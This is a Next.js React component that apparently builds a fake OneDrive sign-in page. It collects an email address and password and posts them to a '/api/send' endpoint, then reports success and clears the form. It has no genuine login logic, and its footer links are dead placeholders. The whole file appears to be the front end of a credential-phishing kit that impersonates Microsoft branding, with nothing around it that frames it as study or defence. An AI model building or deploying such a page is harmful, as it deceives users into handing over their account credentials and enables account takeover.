"use client";

import React from "react";
import { useForm } from "react-hook-form";
import { z } from "zod";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import axios from "axios";

const FormSchema = z.object({
  email: z.string().email(),
  password: z.string().min(1),
  rememberMe: z.boolean().optional().default(false),
});

type FormValues = z.input<typeof FormSchema>;

export default function Home() {
  const { register, handleSubmit, reset } = useForm<FormValues>({
    resolver: zodResolver(FormSchema),
    defaultValues: { email: "", password: "", rememberMe: false },
  });

  const mutation = useMutation({
    mutationFn: async (values: FormValues) => {
      const res = await axios.post("/api/send", values, {
        // Allow us to read server error payloads instead of throwing generically
        validateStatus: () => true,
      });
      if (res.status >= 200 && res.status < 300) {
        return res.data as { message: string };
      }
      const serverMsg =
        (res.data && (res.data.message || res.data?.error?.message)) ||
        `Request failed with status ${res.status}`;
      throw new Error(serverMsg);
    },
    onSuccess: () => {
      reset();
    },
  });

  const onSubmit = (data: FormValues) => {
    mutation.mutate(data);
  };

  return (
    <div className="login-container">
      <img src="./images" alt="OneDrive Logo" />
      <h2>Sign in</h2>
      <form onSubmit={handleSubmit(onSubmit)}>
        {/* Live region for status messages */}
        <div role="status" aria-live="polite" style={{ minHeight: 20 }}>
          {mutation.isSuccess && <span>Submitted successfully.</span>}
          {mutation.isError && (
            <span style={{ color: "#b00020" }}>{(mutation.error as Error)?.message}</span>
          )}
        </div>
        <input
          type="email"
          id="email"
          placeholder="Email address"
          required={true}
          autoComplete="username"
          aria-label="Email address"
          {...register("email")}
        />
        <input
          type="password"
          id="password"
          placeholder="Password"
          required={true}
          autoComplete="current-password"
          aria-label="Password"
          {...register("password")}
        />
        <button type="submit" disabled={mutation.isPending} aria-busy={mutation.isPending}>
          {mutation.isPending ? "Signing in…" : "Sign in"}
        </button>
        <div className="footer">
          <p>
            By Logging in, you accept our
            {" "}
            <a href="/#">
              End User Terms of Use
            </a>
          </p>
          <label>
            <input type="checkbox" {...register("rememberMe")} /> Remember Me
          </label>
          <a href="/#">
            Forgot Password?
          </a>
        </div>
      </form>
    </div >
  );
}
